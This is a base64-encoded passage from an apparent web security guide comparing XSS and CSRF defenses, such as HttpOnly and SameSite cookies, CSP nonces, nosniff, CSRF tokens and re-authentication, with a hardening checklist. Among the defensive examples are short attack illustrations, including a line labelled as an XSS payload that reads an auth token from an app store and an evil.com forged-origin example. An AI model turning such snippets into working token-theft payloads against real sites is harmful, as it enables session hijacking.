5IGNvb2tpZXMgfCBTZXJ2ZXIgfCBgU2V0LUNvb2tpZTogLi4uOyBIdHRwT25seWAuIEpTIGNhbid0IHJlYWQgaXQuIDxtYXJrPkNhdmVhdCBiZWxvdy48L21hcms+IHwKfCBTdG9yZWQgY29udGVudCBzYW5pdGl6YXRpb24gfCBTZXJ2ZXIgfCBDbGVhbiBvbiBpbnB1dC4gQ2xlYW4gb24gb3V0cHV0IHRvby4gQmVsdCBhbmQgc3VzcGVuZGVycy4gfAp8IGBYLUNvbnRlbnQtVHlwZS1PcHRpb25zYCB8IFNlcnZlciB8IGBub3NuaWZmYC4gQnJvd3NlciBzdG9wcyBndWVzc2luZyB3aGF0IGZpbGVzIGFyZSwgc28geW91ciBpbWFnZSB1cGxvYWQgZG9lc24ndCBnZXQgcmVuZGVyZWQgYXMgc2NyaXB0LiB8CnwgVHJ1c3RlZCBUeXBlcyB8IENsaWVudCArIFNlcnZlciB8IENTUCBkaXJlY3RpdmUgdGhhdCBmb3JjZXMgSFRNTCBpbmplY3Rpb24gc2lua3MgdGhyb3VnaCBhIHNhbml0aXplci4gQ2F0Y2hlcyB0aGUgYnVnIGJlZm9yZSBzaGlwLiB8CgpUaGUgZmlyc3QgdHdvIHJvd3MgaGFuZGxlIG1vc3Qgb2YgdGhlIGpvYiwgYW5kIHRoZSByZXN0IGFyZSB0aGVyZSBhcyBleHRyYSBzYWZldHkgbmV0cy4KClRoZSBDU1Agcm93IG5lZWRzIHVucGFja2luZy4gV2l0aCBgc2NyaXB0LXNyYyAnc2VsZicgJ25vbmNlLWFiYzEyMydgLCB0aGUgc2VydmVyIHN0YW1wcyBldmVyeSBsZWdpdGltYXRlIGA8c2NyaXB0PmAgdGFnIHdpdGggdGhhdCBub25jZSwgYW5kIHRoZSBicm93c2VyIGV4ZWN1dGVzIG9ubHkgdGhlIHRhZ3MgY2FycnlpbmcgaXQuIEluamVjdGVkIHNjcmlwdHMgZG9uJ3QgaGF2ZSBpdCwgYW5kIHRoZSBub25jZSBjaGFuZ2VzIG9uIGV2ZXJ5IHJlcXVlc3QsIHNvIGNhcHR1cmluZyBvbmUgYnV5cyBub3RoaW5nLgoKPGRldGFpbHM+CjxzdW1tYXJ5PkRlZXBlcjogd2h5IFhTUyBjYW4ndCBmYWtlIHRoZSBub25jZTwvc3VtbWFyeT4KClRoZSBzZXJ2ZXIgZ2VuZXJhdGVzIHRoZSBub25jZSBhbmQgdGhlIGJyb3dzZXIgY2hlY2tzIGl0LCBzbyB0aGUgYXR0YWNrZXIsIHdobyBjb250cm9scyBuZWl0aGVyIHNpZGUsIGhhcyBub3RoaW5nIHRvIHdvcmsgd2l0aC4KCldoZW4gdGhlIGJyb3dzZXIgcGFyc2VzIHRoZSByZXNwb25zZSwgaXQgY29waWVzIGVhY2ggYG5vbmNlYCBpbnRvIGFuIGludGVybmFsIHNsb3QgZm9yIENTUCBjaGVja3MsIHRoZW4gKip3aXBlcyB0aGUgYXR0cmlidXRlIGZyb20gSlMgcmVhZHMqKjoKCmBgYGpzCmRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoJ3NjcmlwdFtub25jZV0nKS5ub25jZSAgICAgICAgICAgICAgLy8gIiIKZG9jdW1lbnQucXVlcnlTZWxlY3Rvcignc2NyaXB0W25vbmNlXScpLmdldEF0dHJpYnV0ZSgnbm9uY2UnKSAvLyAiIgpgYGAKCldpdGggYSAxMjgtYml0IHJhbmRvbSByZWdlbmVyYXRlZCBwZXIgcmVxdWVzdCwgdGhlcmUncyBub3RoaW5nIGxlZnQgdG8gcmVhZCwgZHVwbGljYXRlLCBvciBicnV0ZS1mb3JjZS4gTm9uY2UgaGlkaW5nIHNoaXBwZWQgaW4gQ2hyb21lIDQ5ICgyMDE2KSwgRmlyZWZveCAzMSwgU2FmYXJpIDExLiBVbml2ZXJzYWwgdG9kYXkuCgpgZXZhbGAgZmFtaWx5IChgZXZhbGAsIGBuZXcgRnVuY3Rpb25gLCBgc2V0VGltZW91dChzdHJpbmcpYCkgaXMgYWxzbyBibG9ja2VkIGJ5IGRlZmF1bHQgQ1NQIHNpbmNlIGAndW5zYWZlLWV2YWwnYCBpc24ndCBvbiB1bmxlc3MgeW91IGFzayBmb3IgaXQuCgpPbmx5IGJyZWFrcyBpZiB5b3UgbWlzY29uZmlndXJlOiBgJ3Vuc2FmZS1pbmxpbmUnYCBjYW5jZWxzIG5vbmNlIGNoZWNrcywgYCd1bnNhZmUtZXZhbCdgIG9wZW5zIGV2YWwsIHN0YXRpYyBvciBsb3ctZW50cm9weSBub25jZSBpcyByZXBsYXlhYmxlLCBgJ3N0cmljdC1keW5hbWljJ2AgY2FuIGJlIGxldmVyYWdlZCB2aWEgYSBjb250cm9sbGFibGUgbG9hZGVyLiBBbGwgY29uZmlnIGJ1Z3MsIG5vdCBtZWNoYW5pc20gZmxhd3MuCgo8L2RldGFpbHM+Cgo8ZGV0YWlscz4KPHN1bW1hcnk+RGVlcGVyOiBub3NuaWZmIGlzIGEgc2VydmUtYmFjayBkZWNpc2lvbiwgbm90IGFuIHVwbG9hZCBvbmU8L3N1bW1hcnk+CgpgWC1Db250ZW50LVR5cGUtT3B0aW9uc2AgYW5kIHRoZSBgQ29udGVudC1UeXBlYCBpdCBwcm90ZWN0cyBhcmUgYm90aCBzZXQgYnkgeW91ciBzZXJ2ZXIgd2hlbiBpdCBzZW5kcyBhIHN0b3JlZCBmaWxlIGJhY2ssIG5vdCB3aGVuIHRoZSBmaWxlIGlzIHVwbG9hZGVkLiBUaGV5IGFyZSB0d28gc2VwYXJhdGUgdHJpcHM6CgotICoqVXBsb2FkKiogKGEgdXNlciBzZW5kcyB5b3UgYSBmaWxlKS4gVGhlIGBDb250ZW50LVR5cGVgIG9uIHRoYXQgcmVxdWVzdCBpcyB3aGF0ZXZlciB0aGUgdXBsb2FkZXIgY2hvc2UsIHNvIGl0IGlzIGF0dGFja2VyLWNvbnRyb2xsZWQuIERvbid0IHN0b3JlIGl0IGFuZCByZXVzZSBpdCBsYXRlci4KLSAqKlNlcnZlLWJhY2sqKiAoeW91ciBzZXJ2ZXIgcmV0dXJucyB0aGUgZmlsZSB0byBhIHZpZXdlcikuIEhlcmUgeW91ciBzZXJ2ZXIgc2V0cyB0aGUgYENvbnRlbnQtVHlwZWAgaXRzZWxmLCBub3JtYWxseSBmcm9tIHRoZSBmaWxlIGV4dGVuc2lvbiAoYC5wbmdgIGJlY29tZXMgYGltYWdlL3BuZ2ApLCBhbmQgYWRkcyBgbm9zbmlmZmAuIFRoaXMgcmVzcG9uc2UgaXMgd2hlcmUgdGhlIGRlY2lzaW9uIGhhcHBlbnMuCgpgbm9zbmlmZmAgdGVsbHMgdGhlIHZpZXdlcidzIGJyb3dzZXIgdG8gdHJ1c3QgdGhlIGBDb250ZW50LVR5cGVgIGZyb20gdGhlIHNlcnZlLWJhY2sgYW5kIG5ldmVyIHJlLWd1ZXNzIGl0IGZyb20gdGhlIGJ5dGVzLiBTbyBpdCBvbmx5IHByb3RlY3RzIHlvdSBpZiB0aGF0IGBDb250ZW50LVR5cGVgIGlzIGNvcnJlY3QuIFNlcnZlIGEgbWFsaWNpb3VzIGBhdmF0YXIucG5nYCBhcyBgaW1hZ2UvcG5nYCBhbmQgdGhlIGJyb3dzZXIgdHJlYXRzIGl0IGFzIGFuIGltYWdlIChhIGJyb2tlbiBvbmUpLCBuZXZlciBhcyBhIHNjcmlwdC4gU2VydmUgaXQgYXMgYHRleHQvaHRtbGAgYmVjYXVzZSB5b3UgY29waWVkIHRoZSB1cGxvYWRlcidzIHZhbHVlLCBhbmQgYG5vc25pZmZgIHdpbGwgdHJ1c3QgdGhhdCBhbmQgcmVuZGVyIGEgcGFnZS4gVGhlIGhlYWRlciBvbmx5IGVuZm9yY2VzIHlvdXIgbGFiZWwsIHNvIHRoZSBsYWJlbCBoYXMgdG8gYmUgcmlnaHQgZmlyc3QuCgpUaGUgdmljdGltIGlzIGEgdGhpcmQgcGFydHk6IGFuIGF0dGFja2VyIHVwbG9hZHMgYSBmaWxlIHdpdGggYSBzY3JpcHQgaW5zaWRlLCB5b3VyIHNlcnZlciBzdG9yZXMgaXQsIGFuZCBhIGRpZmZlcmVudCB1c2VyIG9wZW5zIGl0cyBVUkwuIEV4ZWN1dGlvbiBuZWVkcyB0aGUgZmlsZSB0byBiZSBvcGVuZWQgYXMgYSBkb2N1bWVudCAoYSBkaXJlY3QgbmF2aWdhdGlvbikuIExvYWRlZCB0aHJvdWdoIGA8aW1nPmAsIHRoZSBzYW1lIGZpbGUgb25seSBldmVyIGRlY29kZXMgYXMgaW1hZ2UgYnl0ZXMgYW5kIG5ldmVyIHJ1bnMuCgo8L2RldGFpbHM+CgojIyMgSW1wb3J0YW50OiBIdHRwT25seSBsaW1pdHMgdGhlIGRhbWFnZSwgZG9lcyBub3QgcHJldmVudCBYU1MKCioqYEh0dHBPbmx5YCBzdG9wcyBYU1MgZnJvbSByZWFkaW5nIHRoZSBjb29raWUgdmFsdWUuIEl0IGRvZXMgbm90IHN0b3AgWFNTIGZyb20gdXNpbmcgdGhlIHNlc3Npb24uKiogWFNTIGNhbiBzdGlsbCBydW4gYGZldGNoKCcvdHJhbnNmZXInLCAuLi4pYCBmcm9tIGluc2lkZSB0aGUgb3JpZ2luLCBhbmQgdGhlIGJyb3dzZXIgYXV0by1hdHRhY2hlcyB0aGUgSHR0cE9ubHkgY29va2llLiBUaGUgc2VydmVyIGF1dGhlbnRpY2F0ZXMgdGhlIHJlcXVlc3Qgbm9ybWFsbHkuCgp8IENhcGFiaWxpdHkgfCBXaXRob3V0IGBIdHRwT25seWAgfCBXaXRoIGBIdHRwT25seWAgfAp8LS0tfC0tLXwtLS18CnwgWFNTIHJlYWRzIGBkb2N1bWVudC5jb29raWVgIHwg4pyFIHwg4p2MIHwKfCBYU1MgZXhmaWx0cmF0ZXMgY29va2llIHRvIGF0dGFja2VyIHNlcnZlciB8IOKchSB8IOKdjCB8CnwgWFNTIGlzc3VlcyBhdXRoZW50aWNhdGVkIHJlcXVlc3RzIGluIHZpY3RpbSdzIGJyb3dzZXIgfCDinIUgfCDinIUgfAp8IEF0dGFjayBwZXJzaXN0cyBhZnRlciB2aWN0aW0gY2xvc2VzIHRoZSB0YWIgfCDinIUgfCDinYwgfAp8IENvb2tpZSByZXBsYXllZCBmcm9tIGEgZGlmZmVyZW50IGRldmljZSB8IOKchSB8IOKdjCB8CgpTZXQgYEh0dHBPbmx5YCBhbnl3YXkuIEl0IGNvbnZlcnRzIHBlcm1hbmVudCBjcmVkZW50aWFsIHRoZWZ0IGludG8gYSB0YWItbGlmZXRpbWUgc2Vzc2lvbiBoaWphY2ssIHdoaWNoIGlzIGEgbWVhbmluZ2Z1bCBkb3duZ3JhZGUuIEJ1dCBkb24ndCB0cmVhdCBpdCBhcyB0aGUgWFNTIGRlZmVuc2UuIFRoZSBhY3R1YWwgWFNTIGRlZmVuc2UgaXMgb3V0cHV0IGVuY29kaW5nICsgQ1NQLgoKPGRldGFpbHM+CjxzdW1tYXJ5PkRlZXBlcjogaW4tbWVtb3J5IHRva2VucyBhcmUgc3RpbGwgWFNTLXJlYWRhYmxlPC9zdW1tYXJ5PgoKUHV0dGluZyBhIEpXVCBvciBhY2Nlc3MgdG9rZW4gaW4gbWVtb3J5IChadXN0YW5kLCBSZWFjdCBjb250ZXh0LCBwbGFpbiBtb2R1bGUgdmFyaWFibGUpIGlzICoqYmV0dGVyIHRoYW4gYGxvY2FsU3RvcmFnZWAsIG5vdCBzYWZlIGZyb20gWFNTKiouIFhTUyBydW5zIGluIHlvdXIgb3JpZ2luLiBBbnkgSlMtcmVhY2hhYmxlIHN0YXRlIGlzIHJlYWNoYWJsZToKCmBgYGpzCi8vIFhTUyBwYXlsb2FkLCBrbm93aW5nIHRoZSBzdG9yZQp1c2VBdXRoU3RvcmUuZ2V0U3RhdGUoKS50b2tlbgovLyBvciBzY2FubmluZyB0aGUgUmVhY3QgZmliZXIgdHJlZSwgb3IgZ3JhYmJpbmcgY2xvc3VyZXMgdmlhIERldlRvb2xzCmBgYAoKVGhlIGFkdmFudGFnZXMgb3ZlciBgbG9jYWxTdG9yYWdlYCBhcmUgcmVhbCBidXQgdGhleSdyZSBhYm91dCBsaW1pdGluZyB0aGUgZGFtYWdlLCBub3QgaW52aXNpYmlsaXR5OgoKLSAqKkhhcmRlciBmb3IgYSBnZW5lcmljIFhTUyB0ZW1wbGF0ZS4qKiBgbG9jYWxTdG9yYWdlLmdldEl0ZW0oJ3Rva2VuJylgIHdvcmtzIG9uIGV2ZXJ5IHNpdGUuIFJlYWRpbmcgYSBadXN0YW5kIHN0b3JlIG5lZWRzIGtub3dsZWRnZSBvZiB0aGUgc3RvcmUncyByZWZlcmVuY2UsIHdoaWNoIHZhcmllcyBwZXIgYXBwLiBEcml2ZS1ieSBYU1MgcGF5bG9hZHMgY29sbGVjdCAxMDAlIG9mIGBsb2NhbFN0b3JhZ2VgIHRva2VucywgbXVjaCBmZXdlciBpbi1tZW1vcnkgb25lcy4KLSAqKk9uY2UgdGhlIHVzZXIgY2xvc2VzIHRoZSB0YWIsIHRoZSB0b2tlbiBkaXNhcHBlYXJzIGFsb25nIHdpdGggaXQuKiogQ2xvc2UgdGFiIG9yIHJlbG9hZCwgWFNTIGdvbmUsIGF0dGFja2VyIGxvc2VzIHRoZSBoYW5kbGUuIGBsb2NhbFN0b3JhZ2VgIHBlcnNpc3RzIGFjcm9zcyByZWxvYWRzLCBhbmQgc3RvbGVuIHRva2VucyByZXBsYXkgZnJvbSBhbnkgZGV2aWNlIHVudGlsIGV4cGlyeS4KClNhbWUgbG9naWMgYXMgYEh0dHBPbmx5YCBjb29raWVzOiBkcm9wICJwZXJtYW5lbnQgY3JlZGVudGlhbCBjYXB0dXJlZCIgZG93biB0byAidGFiLWxpZmV0aW1lIHNlc3Npb24gaGlqYWNrLiIgQ29tYmluZWQgd2l0aCBzaG9ydC1saXZlZCBhY2Nlc3MgdG9rZW5zICg1LTE1IG1pbikgYW5kIEh0dHBPbmx5IHJlZnJlc2ggY29va2llcywgdGhlIHJlYWwgZGFtYWdlIHdpbmRvdyBpcyBzbWFsbC4KCjwvZGV0YWlscz4KCi0tLQoKIyMgQ1NSRiBkZWZlbnNlcywgbGF5ZXJlZAoKKipSZWFkIHRoaXMgd2hvbGUgdGFibGUgYXNzdW1pbmcgWFNTIGlzIGFscmVhZHkgcHJldmVudGVkLioqIEFsbW9zdCBldmVyeSBDU1JGIGRlZmVuc2UgaGVyZSBzdG9wcyB3b3JraW5nIG9uY2UgYW4gYXR0YWNrZXIgaGFzIFhTUywgYmVjYXVzZSBYU1MgcnVucyBhcyB5b3VyIG93biBvcmlnaW4gYW5kIHJlYWRzIHRoZSB0b2tlbiwgdGhlIERPTSwgYW5kIHRoZSBwYWdlIHN0YXRlIGRpcmVjdGx5LiBUaGUgIlN0aWxsIHdvcmtzIHVuZGVyIFhTUz8iIGNvbHVtbiBtYWtlcyB0aGF0IGRlcGVuZGVuY3kgdmlzaWJsZS4KCnwgTGF5ZXIgfCBXaG8gfCBXaGF0IHwgU3RpbGwgd29ya3MgdW5kZXIgWFNTPyB8CnwtLS18LS0tfC0tLXwtLS18CnwgYFNhbWVTaXRlYCBjb29raWUgfCBCcm93c2VyICsgU2VydmVyIHwgYFNldC1Db29raWU6IC4uLjsgU2FtZVNpdGU9TGF4YC4gQmxvY2tzIGNyb3NzLXNpdGUgc3ViLXJlc291cmNlIHJlcXVlc3RzLiBCcm93c2VyIGRlZmF1bHQgc2luY2UgQ2hyb21lIDgwICgyMDIwKSwgc2V0IGl0IGV4cGxpY2l0bHkgYW55d2F5LiB8IE5vLiBYU1MgcnVucyBzYW1lLXNpdGUsIGNvb2tpZSBhdHRhY2hlcyBub3JtYWxseS4gfAp8IGBTYW1lU2l0ZT1TdHJpY3RgIHwgU2VydmVyIHwgYFNldC1Db29raWU6IC4uLjsgU2FtZVNpdGU9U3RyaWN0YC4gRXZlbiB0b3AtbGV2ZWwgY3Jvc3Mtc2l0ZSBuYXZpZ2F0aW9uIHNraXBzIHRoZSBjb29raWUuIFVzZSBmb3IgYWRtaW4gLyBmaW5hbmNpYWwgZW5kcG9pbnRzLiB8IE5vLiBTYW1lIHJlYXNvbi4gfAp8IENTUkYgdG9rZW4gfCBDbGllbnQgKyBTZXJ2ZXIgfCBTZXJ2ZXIgcGxhbnRzIGEgdG9rZW4gaW4gdGhlIGZvcm0gLyByZXNwb25zZS4gU3RhdGUtY2hhbmdpbmcgcmVxdWVzdHMgbXVzdCBlY2hvIGl0IGJhY2suIGBldmlsLmNvbWAgY2FuJ3QgcmVhZCBpdCAoU09QKSwgY2FuJ3QgZm9yZ2UgaXQuIHwgTm8uIFhTUyByZWFkcyBpdCBmcm9tIHRoZSBET00gYW5kIGluY2x1ZGVzIGl0LiB8CnwgYE9yaWdpbmAgLyBgUmVmZXJlcmAgY2hlY2sgfCBTZXJ2ZXIgfCBMb29rIGF0IHRoZSBoZWFkZXIuIElmIGEgcmVxdWVzdCB0byB5b3VyIGAvdHJhbnNmZXJgIGNhcnJpZXMgYE9yaWdpbjogZXZpbC5jb21gLCByZWplY3QgaXQuIHwgTm8uIFhTUyByZXF1ZXN0cyBjYXJyeSB5b3VyIHJlYWwgYE9yaWdpbmAuIHwKfCBWZXJiIGRpc2NpcGxpbmUgfCBTZXJ2ZXIgfCBHRVQgbmV2ZXIgY2hhbmdlcyBzdGF0ZS4gSW1hZ2UgdGFncyBjYW4gZmlyZSBHRVQsIG5vdCBQT1NULiBGb3JjZXMgYXR0YWNrZXJzIHRvIHdyaXRlIG1vcmUuIHwgTm8uIFhTUyBkb2VzIGFueSB2ZXJiLiB8CnwgU2tpcCBjb29raWVzIHwgQXJjaGl0ZWN0dXJlIHwgSldUIGluIGBBdXRob3JpemF0aW9uYCBoZWFkZXIuIE5vIGF1dG8tYXR0YWNoLCBubyBDU1JGIHN1cmZhY2UuIHwgTm8sIHdvcnNlLiBgbG9jYWxTdG9yYWdlYCBKV1QgaXMgb25lIGxpbmUgYXdheSBmcm9tIFhTUy4gfAp8IFJlLWF1dGggLyBNRkEgb24gc2Vuc2l0aXZlIG9wcyB8IFNlcnZlciArIENsaWVudCArIFVzZXIgfCBSZS1lbnRlciBwYXNzd29yZCAvIHB1c2ggYSBoYXJkd2FyZSBrZXkgKFdlYkF1dGhuLCBUT1RQKSBiZWZvcmUgaGlnaC1pbXBhY3QgYWN0aW9ucy4gfCAqKlllcy4qKiBYU1MgY2FuJ3QgZmFrZSBhIHBhc3N3b3JkIG9yIGEgaGFyZHdhcmUgdGFwIHdpdGhvdXQgdGhlIGh1bWFuLiBPbmx5IG1lYW5pbmdmdWwgcmVzaWR1YWwgbGF5ZXIgb25jZSBYU1MgaXMgaW4uIHwKCi0tLQoKIyMgV2h5IFhTUyBkb21pbmF0ZXMKClRoZSB0YWJsZSBhYm92ZSBhbHJlYWR5IHNob3dlZCB3aHk6IHVuZGVyIFhTUyBldmVyeSBzdGFuZGFyZCBDU1JGIGxheWVyIHN0b3BzIHdvcmtpbmcsIGFuZCB0aGUgb25seSB0aGluZyBsZWZ0IGlzIG91dC1vZi1iYW5kIHJlLWF1dGgsIGJlY2F1c2UgWFNTIGNhbid0IHN1cHBseSBjcmVkZW50aWFscyBpdCBkb2Vzbid0IGhhdmUuCgpQcmFjdGljYWwgcHJpb3JpdHk6CgoxLiAqKlN0b3AgWFNTIGZpcnN0LioqIEZyYW1ld29yayBhdXRvLWVzY2FwZSArIENTUCArIHNhbml0aXplIHN0b3JlZCBpbnB1dCArIG5vc25pZmYsIHdpdGggYEh0dHBPbmx5YCBjYXBwaW5nIHRoZSBkYW1hZ2UuCjIuICoqVGhlbiBsYXllciBDU1JGIGRlZmVuc2VzIG9uIHRvcC4qKiBTYW1lU2l0ZSArIHRva2VuICsgT3JpZ2luIGNoZWNrLiBUaGVzZSBhZGQgdmFsdWUgb25seSB3aGVuIFhTUyBpcyBhbHJlYWR5IHByZXZlbnRlZC4KMy4gKipGb3IgaGlnaC1zdGFrZXMgb3BlcmF0aW9ucywgYWRkIHJlLWF1dGggb3IgTUZBLioqIFRoaXMgaXMgdGhlIG9ubHkgbGF5ZXIgdGhhdCBzdGlsbCB3b3JrcyBhZnRlciBhIHN1Y2Nlc3NmdWwgWFNTLCBiZWNhdXNlIGl0IGRlcGVuZHMgb24gc29tZXRoaW5nIFhTUyBjYW4ndCBmYWtlLgoKQSBzaXRlIHdpdGggZ3JlYXQgQ1NSRiBkZWZlbnNlcyBhbmQgbm8gWFNTIHByb3RlY3Rpb24gaXMgYSBob3VzZSB3aXRoIGEgbG9ja2VkIGZyb250IGRvb3IgYW5kIG9wZW4gd2luZG93cy4gVGhlIGF0dGFja2VyIHdhbGtzIHRocm91Z2ggYSB3aW5kb3cgYW5kIHVubG9ja3MgdGhlIGRvb3IgZnJvbSBpbnNpZGUuCgotLS0KCiMjIFdoYXQgSSdkIGRvIHRvZGF5CgpTYW1lIGRlZmVuc2VzLCBhc3NlbWJsZWQgcGVyIGFyY2hpdGVjdHVyZS4gRWFjaCBsYWRkZXIgc3RhcnRzIGZyb20gdGhlIG5haXZlIHZlcnNpb24gYW5kIGFkZHMgb25lIGxheWVyIGF0IGEgdGltZS4KCjxkZXRhaWxzPgo8c3VtbWFyeT5IYXJkZW4gYSBjb29raWUtc2Vzc2lvbiBhcHAsIHN0ZXAgYnkgc3RlcDwvc3VtbWFyeT4KCkZvdW5kYXRpb24gZmlyc3QsIHNhbWUgYXMgdGhlIEpXVCBhcHA6IENTUCBub25jZSwgZnJhbWV3b3JrIGF1dG8tZXNjYXBlLCBhbmQgbm9zbmlmZi4gQW4gWFNTIGdldHRpbmcgaW4gdm9pZHMgZXZlcnkgY29va2llIGFuZCBDU1JGIGxheWVyIGJlbG93IGl0LCBzbyB0cmVhdCB0aGUgYW50aS1YU1MgbGF5ZXIgYXMgdGhlIGZsb29yLCBub3QgYSBzdGVwIHlvdSBjbGltYiB0byBsYXRlci4gRXZlcnl0aGluZyBudW1iZXJlZCBiZWxvdyBoYXJkZW5zIHRoZSBjb29raWUgaXRzZWxmIGFuZCBhc3N1bWVzIHRoYXQgZm91bmRhdGlvbiBpcyBhbHJlYWR5IGluIHBsYWNlLgoKVGhlIG51bWJlcmVkIG9yZGVyIHRoZW4gd2Fsa3MgdGhlIGNvb2tpZSBmcm9tIG5ha2VkIHRvIGhhcmRlbmVkLiBUaGVzZSBzdGVwcyBhcmUgbnVtYmVyZWQsIG5vdCBsZXR0ZXJlZCBsaWtlIHRoZSBKV1QgbGFkZGVyIGJlbG93LCBiZWNhdXNlIGVhY2ggb25lIHN0YWNrcyBvbiB0aGUgbGFzdDogeW91IGZpbmlzaCB3aXRoIGFsbCBvZiB0aGVtLCBub3Qgb25lLiBUaGF0IG9yZGVyIGZvbGxvd3MgaW1wbGVtZW50YXRpb24gY29zdCwgbm90IGRlZmVuc2UgdmFsdWUuIFR3byBkaWZmZXJlbnQgYXhlcywgYW5kIHRoZXkgZGlzYWdyZWU6Cgp8IExheWVyIHwgQ29zdCB8IFZhbHVlIHwKfC0tLXwtLS18LS0tfAp8IGBIdHRwT25seWAgKyBgU2VjdXJlYCArIGBub3NuaWZmYCB8IG9uZSBsaW5lIGVhY2ggfCBjYXBzIGRhbWFnZSwgZG9lcyBub3Qgc3RvcCB0aGUgYXR0YWNrIHwKfCBgU2FtZVNpdGVgIHwgb25lIGxpbmUgfCBraWxscyBjbGFzc2ljIENTUkYsIG5vdGhpbmcgZWxzZSB8CnwgQ1NSRiB0b2tlbiB8IHdpcmUgZXZlcnkgZm9ybSB8IGZhbGxzIHRoZSBtb21lbnQgWFNTIGxhbmRzIHwKfCBDU1Agbm9uY2UgfCByZWFsIHByb2plY3Qgd29yazogdGhlIHNlcnZlciBnZW5lcmF0ZXMgYSBub25jZSBwZXIgcmVxdWVzdCwgZXZlcnkgdGVtcGxhdGUgaW5qZWN0cyBpdCwgZXZlcnkgdGhpcmQtcGFydHkgc2NyaXB0IGdldHMgYXVkaXRlZC4gTWlzcyBvbmUgYW5kIHRoZSBwYWdlIGJyZWFrcyB8IGhpZ2hlc3QgdmFsdWUgaW4gdGhlIHN0YWNrLiBJdCBraWxscyBpbmplY3RlZCBzY3JpcHQgYXQgdGhlIGV4ZWN1dGlvbiBzdGVwLCBhbmQgWFNTIGlzIHRoZSBhdHRhY2sgdGhhdCBnZXRzIHBhc3QgZXZlcnkgb3RoZXIgbGF5ZXIgfAoKU28gdGhlIGxhZGRlciBvcmRlciBpcyBmb3IgcmV0cm9maXR0aW5nIGFuIGV4aXN0aW5nIGFwcCB3aXRob3V0IGJyZWFraW5nIGl0OiBjaGVhcCBoeWdpZW5lIGZpcnN0LCB0aGUgZXhwZW5zaXZlIGhpZ2gtdmFsdWUgbGF5ZXIgd2hlbiB5b3UgY2FuIHNjaGVkdWxlIGl0LiBTdGFydGluZyBhIGZyZXNoIHByb2plY3Q/IERvIENTUCBvbiBkYXkgb25lLgoKKiowLiBCYXJlIGNvb2tpZS4qKiBFdmVyeXRoaW5nIGlzIGV4cG9zZWQ6IFhTUyBjYW4gcmVhZCBpdCwgQ1NSRiBjYW4gdXNlIGl0LCBhbmQgaXQgdHJhdmVscyBpbiBwbGFpbnRleHQuCgpgYGAKU2V0LUNvb2tpZTogc2Vzc2lvbj1hYmMxMjMKYGBgCgoqKjEuIExvY2sgdGhlIGNvb2tpZSBkb3duLCBhbmQgc2hpcCB0aGUgZnJlZSBoZWFkZXIgd2hpbGUgeW91IGFyZSBoZXJlLioqIGBIdHRwT25seWAgc3RvcHMgSlMgcmVhZGluZyBpdCwgYFNlY3VyZWAga2VlcHMgaXQgb2ZmIHBsYWludGV4dCBIVFRQLiBgbm9zbmlmZmAgaXMgb25lIGxpbmUgYW5kIGJlbG9uZ3MgaW4gdGhpcyBiYXRjaCwgZXZlbiB0aG91Z2ggaXQgZGVmZW5kcyB0aGUgc2NyaXB0LWV4ZWN1dGlvbiBsYXllciBjb3ZlcmVkIGluIHN0ZXAgNC4KCmBgYApTZXQtQ29va2llOiBzZXNzaW9uPWFiYzEyMzsgSHR0cE9ubHk7IFNlY3VyZTsgUGF0aD0vClgtQ29udGVudC1UeXBlLU9wdGlvbnM6IG5vc25pZmYKYGBgCgpYU1MgY2FuIG5vIGxvbmdlciBleGZpbHRyYXRlIGl0LiBJdCBjYW4gc3RpbGwgKnVzZSogdGhlIHNlc3Npb24gZnJvbSBpbnNpZGUgdGhlIHBhZ2UsIHNvIHRoaXMgaXMgYSBkb3duZ3JhZGUsIG5vdCBhIGN1cmUuCgoqKjIuIEtpbGwgY2xhc3NpYyBDU1JGIHdpdGggYFNhbWVTaXRlYC4qKiBDcm9zcy1zaXRlIHN1Yi1yZXNvdXJjZSByZXF1ZXN0cyAodGhlIGA8aW1nIHNyYz0iYmFuay5jb20vdHJhbnNmZXIiPmAgdHJpY2spIHN0b3AgY2FycnlpbmcgdGhlIGNvb2tpZS4KCmBgYApTZXQtQ29va2llOiBzZXNzaW9uPWFiYzEyMzsgSHR0cE9ubHk7IFNlY3VyZTsgU2FtZVNpdGU9TGF4OyBQYXRoPS8KYGBgCgpVc2UgYFNhbWVTaXRlPVN0cmljdGAgZm9yIGFkbWluIGFuZCBtb25leSBlbmRwb2ludHMuCgoqKjMuIEFkZCBhIENTUkYgdG9rZW4qKiBvbiBzdGF0ZS1jaGFuZ2luZyByZXF1ZXN0cywgc2luY2UgYFNhbWVTaXRlYCBoYXMgZWRnZSBjYXNlcy4KCmBgYGh0bWwKPGZvcm0gYWN0aW9uPSIvdHJhbnNmZXIiIG1ldGhvZD0iUE9TVCI+CiAgPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iY3NyZl90b2tlbiIgdmFsdWU9Int7IGNzcmZUb2tlbiB9fSI+CjwvZm9ybT4KYGBgCgpgYGBqcwovLyBzZXJ2ZXIsIG9uIFBPU1QKaWYgKHJlcS5ib2R5LmNzcmZfdG9rZW4gIT09IHNlc3Npb24uY3NyZlRva2VuKSByZXR1cm4gcmVzLnN0YXR1cyg0MDMpLmVuZCgpCmBgYAoKKio0LiBUaGUgZm91bmRhdGlvbiwgd3JpdHRlbiBvdXQuKiogQ1NQIG5vbmNlIGFuZCBmcmFtZXdvcmsgYXV0by1lc2NhcGUgKGBub3NuaWZmYCBhbHJlYWR5IHNoaXBwZWQgaW4gc3RlcCAxKS4gVGhpcyBpcyB0aGUgZmxvb3IgZnJvbSB0aGUgdG9wIG9mIHRoaXMgbGlzdC4gSWYgeW91IHN0YXJ0ZWQgYSBmcmVzaCBwcm9qZWN0IGhlcmUsIHRoZSBib3ggaXMgYWxyZWFkeSB0aWNrZWQgYW5kIGV2ZXJ5dGhpbmcgYWJvdmUgd2FzIHRoZSBjaGVhcCBoeWdpZW5lIHlvdSBsYXllcmVkIG9uIGFmdGVyLgoKYGBgCkNvbnRlbnQtU2VjdXJpdHktUG9saWN5OiBzY3JpcHQtc3JjICdzZWxmJyAnbm9uY2UtUkFORE9NJwpgYGAKCmBgYGpzeAo8ZGl2Pnt1c2VySW5wdXR9PC9kaXY+ICAgLy8gc2FmZSwgdGhlIGZyYW1ld29yayBlc2NhcGVzIGl0Ci8vIG5ldmVyIGZlZWQgdXNlciBkYXRhIHRvIGRhbmdlcm91c2x5U2V0SW5uZXJIVE1MIC8gdi1odG1sIC8gaW5uZXJIVE1MCmBgYAoKKio1LiBSZWplY3QgZm9yZWlnbiBgT3JpZ2luYCoqIG9uIHN0YXRlLWNoYW5naW5nIHJvdXRlcy4gQ2hlYXAgc2Vjb25kIGxheWVyLgoKYGBganMKaWYgKH